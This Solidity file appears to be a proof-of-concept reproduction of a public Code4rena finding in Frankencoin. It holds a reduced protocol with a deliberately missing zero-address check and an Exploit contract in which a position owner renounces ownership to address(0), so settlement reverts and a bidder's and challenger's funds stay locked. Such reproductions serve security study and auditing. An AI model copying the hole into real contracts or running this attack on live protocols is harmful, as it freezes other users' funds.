// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Frankencoin (ZCHF) — [H-04] Transfer position ownership to addr(0) to
    DoS end() challenge (Code4rena 2023-04-frankencoin, finding #20019,
    reporter __141345__).

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.

    Root cause: a position owner who is about to lose a challenge can call
    `transferOwnership(address(0))`. On successful settlement MintingHub.end
    refunds excess bid to the position owner via `zchf.transfer(owner, …)`.
    ZCHF's ERC20 `_transfer` requires `recipient != address(0)`, so the whole
    `end()` reverts — permanently. The successful bidder's bid stays locked
    in the hub and the challenger's escrowed collateral cannot be released.

    Blamed lines preserved:
      - MintingHub.end excess refund: zchf.transfer(owner, effectiveBid - fundsNeeded)
      - ERC20._transfer: require(recipient != address(0))
//////////////////////////////////////////////////////////////////////////*/

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

/// @dev Minimal ZCHF with the verbatim zero-address guard from ERC20._transfer.
contract ZCHF is IERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        _transfer(msg.sender, to, amt);
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) {
            uint256 a = allowance[from][msg.sender];
            require(a >= amt, "allow");
            allowance[from][msg.sender] = a - amt;
        }
        _transfer(from, to, amt);
        return true;
    }

    /// @notice Verbatim guard from contracts/ERC20.sol L151-152.
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(recipient != address(0)); // @> VULN (guard): zero-address transfer reverts —
        // when position.owner is address(0), MintingHub.end's refund to owner reverts and DoSes settlement.
        balanceOf[sender] -= amount;
        balanceOf[recipient] += amount;
    }
}

contract CollateralToken is IERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) {
            uint256 a = allowance[from][msg.sender];
            require(a >= amt, "allow");
            allowance[from][msg.sender] = a - amt;
        }
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @notice Reduced Position — ownership is transferable with NO zero-address check.
contract Position {
    address public owner;
    address public immutable hub;
    IERC20 public immutable collateral;
    uint256 public minted;
    uint256 public challengedAmount;
    uint32 public constant reserveContribution = 0;

    constructor(address _owner, address _hub, address _collateral) {
        owner = _owner;
        hub = _hub;
        collateral = IERC20(_collateral);
        minted = 1000e18; // outstanding debt so repayment is non-zero
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "owner");
        _;
    }

    modifier onlyHub() {
        require(msg.sender == hub, "hub");
        _;
    }

    /// @notice Ownership transfer with no zero-address guard (the enabler).
    function transferOwnership(address newOwner) external onlyOwner {
        // @> VULN (enabler): ownership may be set to address(0) — nothing forbids it.
        // FIX: require(newOwner != address(0)).
        owner = newOwner;
    }

    function notifyChallengeStarted(uint256 size) external onlyHub {
        challengedAmount += size;
    }

    function notifyChallengeSucceeded(address _bidder, uint256 _bid, uint256 _size)
        external
        onlyHub
        returns (address, uint256, uint256, uint256, uint32)
    {
        challengedAmount -= _size;
        // Force excess refund path: effectiveBid (=_bid) > fundsNeeded.
        // repayment = outstanding minted, volume for reward calc = _bid.
        uint256 repayment = minted;
        minted = 0;
        // Transfer challenged collateral to the winning bidder (simplified).
        uint256 colBal = collateral.balanceOf(address(this));
        if (_size > colBal) _size = colBal;
        if (_size > 0) {
            collateral.transfer(_bidder, _size);
        }
        return (owner, _bid, _bid, repayment, reserveContribution);
    }
}

/// @notice Reduced MintingHub with the verbatim excess-to-owner transfer that
///         reverts when owner is address(0).
contract MintingHub {
    uint256 public constant CHALLENGER_REWARD_PPM = 50_000; // 5% of volume in PPM of 1e6 → use 50/1000 = 5% simplified
    // Finding uses CHALLENGER_REWARD / 1000_000; we use 50/1000 = 5%.

    ZCHF public immutable zchf;

    struct Challenge {
        address challenger;
        Position position;
        uint256 size;
        uint256 end;
        address bidder;
        uint256 bid;
    }

    Challenge[] public challenges;

    constructor(ZCHF _zchf) {
        zchf = _zchf;
    }

    function launchChallenge(Position position, uint256 size) external returns (uint256) {
        // Escrow challenger collateral into the hub.
        position.collateral().transferFrom(msg.sender, address(this), size);
        uint256 id = challenges.length;
        challenges.push(Challenge(msg.sender, position, size, block.timestamp, address(0), 0));
        position.notifyChallengeStarted(size);
        return id;
    }

    function placeBid(uint256 id, uint256 bidAmount) external {
        Challenge storage c = challenges[id];
        require(c.challenger != address(0), "no challenge");
        // Pull bid into the hub.
        zchf.transferFrom(msg.sender, address(this), bidAmount);
        // Return previous bid if any.
        if (c.bidder != address(0) && c.bid > 0) {
            zchf.transfer(c.bidder, c.bid);
        }
        c.bidder = msg.sender;
        c.bid = bidAmount;
    }

    /// @notice Verbatim reduction of MintingHub.end (L252-268 path). When
    ///         `owner == address(0)` and there is excess bid, the transfer reverts.
    function end(uint256 _challengeNumber, bool /*postponeCollateralReturn*/) public {
        Challenge storage challenge = challenges[_challengeNumber];
        require(challenge.challenger != address(0x0));
        require(block.timestamp >= challenge.end, "period has not ended");

        address recipient = challenge.bidder == address(0x0) ? msg.sender : challenge.bidder;
        (address owner, uint256 effectiveBid, uint256 volume, uint256 repayment,) =
            challenge.position.notifyChallengeSucceeded(recipient, challenge.bid, challenge.size);

        if (effectiveBid < challenge.bid) {
            zchf.transfer(challenge.bidder, challenge.bid - effectiveBid);
        }
        uint256 reward = (volume * 50) / 1000; // 5% challenger reward (simplified)
        uint256 fundsNeeded = reward + repayment;
        if (effectiveBid > fundsNeeded) {
            // @> VULN: refund excess bid to position owner — reverts when owner is address(0)
            // because ZCHF._transfer requires recipient != address(0). DoSes the entire end().
            // FIX: disallow transferOwnership(address(0)); and/or skip/burn excess when owner==0.
            zchf.transfer(owner, effectiveBid - fundsNeeded);
        }
        // (challenger reward + burn repayment omitted for reduction)
        delete challenges[_challengeNumber];
    }

    function challengeBidder(uint256 id) external view returns (address) {
        return challenges[id].bidder;
    }

    function challengeBid(uint256 id) external view returns (uint256) {
        return challenges[id].bid;
    }
}

/// @notice Bidder who places a winning bid (victim of locked funds).
contract Bidder {
    ZCHF public immutable zchf;
    MintingHub public immutable hub;

    constructor(ZCHF _zchf, MintingHub _hub) {
        zchf = _zchf;
        hub = _hub;
    }

    function bid(uint256 id, uint256 amount) external {
        zchf.approve(address(hub), amount);
        hub.placeBid(id, amount);
    }
}

/// @notice Challenger who escrows collateral (also harmed — cannot recover).
contract Challenger {
    CollateralToken public immutable col;
    MintingHub public immutable hub;

    constructor(CollateralToken _col, MintingHub _hub) {
        col = _col;
        hub = _hub;
    }

    function challenge(Position position, uint256 size) external returns (uint256) {
        col.approve(address(hub), size);
        return hub.launchChallenge(position, size);
    }
}

/// @notice Owner transfers ownership to address(0) so end() reverts on the
///         excess refund, locking the bidder's ZCHF and the challenger's collateral.
contract Exploit {
    uint256 public constant BID = 1060e18;
    uint256 public constant REPAYMENT = 1000e18; // position.minted
    uint256 public constant REWARD = (1060e18 * 50) / 1000; // 53e18
    // fundsNeeded = 53e18 + 1000e18 = 1053e18; excess = 1060 - 1053 = 7e18 > 0 → refund path

    ZCHF public zchf;
    CollateralToken public col;
    MintingHub public hub;
    Position public position;
    Bidder public bidder;
    Challenger public challenger;

    bool public endReverted;
    uint256 public lockedBid;
    uint256 public lockedCollateral;

    constructor() {
        // Fixed CREATE order:
        zchf = new ZCHF(); //                  nonce 1
        col = new CollateralToken(); //        nonce 2
        hub = new MintingHub(zchf); //         nonce 3
        position = new Position(address(this), address(hub), address(col)); // nonce 4
        bidder = new Bidder(zchf, hub); //     nonce 5
        challenger = new Challenger(col, hub); // nonce 6

        // Position holds collateral that the successful challenge will seize.
        col.mint(address(position), 1e18);
        // Challenger escrows matching size into the hub on challenge.
        col.mint(address(challenger), 1e18);
        // Bidder funds the winning bid.
        zchf.mint(address(bidder), BID);
    }

    function run() external {
        // 1. Challenge + winning bid (period 0 — endable now).
        uint256 id = challenger.challenge(position, 1e18);
        bidder.bid(id, BID);
        require(zchf.balanceOf(address(hub)) == BID, "bid not escrowed");
        require(col.balanceOf(address(hub)) == 1e18, "challenger escrow missing");

        // 2. Owner, facing an unavoidable loss, renounces to address(0).
        position.transferOwnership(address(0));
        require(position.owner() == address(0), "owner not zeroed");

        // 3. Anyone tries to settle — reverts on zchf.transfer(address(0), excess).
        try hub.end(id, false) {
            // must not succeed
        } catch {
            endReverted = true;
        }

        lockedBid = zchf.balanceOf(address(hub));
        lockedCollateral = col.balanceOf(address(hub));

        // HARM: settlement permanently DoSed; bidder's ZCHF and challenger's
        // collateral remain locked in the hub with no recovery path.
        require(endReverted, "end() should revert");
        require(lockedBid == BID, "bid not locked");
        require(lockedCollateral == 1e18, "challenger collateral not locked");
        require(hub.challengeBidder(id) == address(bidder), "challenge still open");
    }
}
